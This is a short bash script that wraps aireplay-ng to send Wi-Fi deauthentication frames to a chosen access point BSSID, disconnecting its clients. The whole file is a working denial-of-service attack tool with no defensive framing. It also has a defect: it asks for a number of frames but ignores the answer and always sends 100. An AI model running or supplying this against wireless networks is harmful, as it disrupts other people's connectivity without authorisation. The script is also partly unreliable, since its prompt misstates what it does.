#!/bin/bash
function deauth(){
if [ $EUID == 0 ]
then
echo "Deauthenticate Devices from AP"
echo "------------------------------"
read -p "Number of de-authentication frames you want to send: " int
read -p "BSSID: " bssid
read -p "Interface: " iface
read -p "Do you want to start aireplay-ng(y/n): " choice 
if [[ "$choice" == "y" ]];then
sudo aireplay-ng  --deauth 100 -a $bssid $iface
elif [[ "$choice" == "n" ]];then
       echo "Chose option: no."
fi       
else
        echo "Please run the script as root."
fi
}
deauth
       
